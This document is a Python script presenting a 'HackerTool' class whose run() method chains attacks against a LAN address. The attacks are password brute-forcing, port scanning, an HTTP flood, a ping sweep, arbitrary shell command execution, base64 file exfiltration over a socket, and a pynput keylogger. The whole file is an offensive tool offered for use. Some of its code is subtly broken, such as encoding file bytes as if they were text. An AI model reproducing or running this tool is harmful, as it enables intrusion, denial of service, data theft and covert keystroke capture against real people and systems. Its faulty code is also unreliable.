import socket
 
import threading

import os

import random

import time

import sys

import hashlib

import base64


class HackerTool:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False

    def connect(self):
        try:
            self.sock.connect((self.target_ip, self.target_port))
            self.connected = True
            print(f"Connected to {self.target_ip}:{self.target_port}")
        except Exception as e:
            print(f"Connection failed: {e}")

    def send_data(self, data):
        if self.connected:
            self.sock.sendall(data.encode())
            print(f"Sent: {data}")
        else:
            print("Not connected to target.")

    def receive_data(self):
        if self.connected:
            response = self.sock.recv(4096).decode()
            print(f"Received: {response}")
            return response
        return None

    def close_connection(self):
        self.sock.close()
        self.connected = False
        print("Connection closed.")

    def brute_force(self, username, password_list):
        for password in password_list:
            self.send_data(f"LOGIN {username} {password}")
            response = self.receive_data()
            if "SUCCESS" in response:
                print(f"Password found: {password}")
                break

    def port_scanner(self, start_port, end_port):
        open_ports = []
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open.")
            sock.close()
        return open_ports

    def ddos_attack(self, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            self.send_data("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target_ip))
            time.sleep(0.1)

    def generate_hash(self, data):
        return hashlib.sha256(data.encode()).hexdigest()

    def encode_data(self, data):
        return base64.b64encode(data.encode()).decode()

    def decode_data(self, data):
        return base64.b64decode(data).decode()

    def random_ip(self):
        return ".".join(str(random.randint(0, 255)) for _ in range(4))

    def ping_sweep(self, subnet):
        for i in range(1, 255):
            ip = f"{subnet}.{i}"
            response = os.system(f"ping -c 1 {ip}")
            if response == 0:
                print(f"{ip} is alive.")

    def execute_command(self, command):
        os.system(command)

    def file_exfiltration(self, file_path):
        with open(file_path, 'rb') as file:
            data = file.read()
            encoded_data = self.encode_data(data)
            self.send_data(encoded_data)

    def keylogger(self):
        import pynput
        from pynput.keyboard import Key, Listener

        def on_press(key):
            with open("keylog.txt", "a") as log_file:
                log_file.write(f"{key} ")

        with Listener(on_press=on_press) as listener:
            listener.join()

    def run(self):
        self.connect()
        self.brute_force("admin", ["123456", "password", "admin", "letmein"])
        open_ports = self.port_scanner(1, 1024)
        self.ddos_attack(10)
        self.ping_sweep("192.168.1")
        self.file_exfiltration("sensitive_data.txt")
        self.close_connection()

if __name__ == "__main__":
    target_ip = "192.168.1.1"
    target_port = 80
    hacker_tool = HackerTool(target_ip, target_port)
    hacker_tool.run()
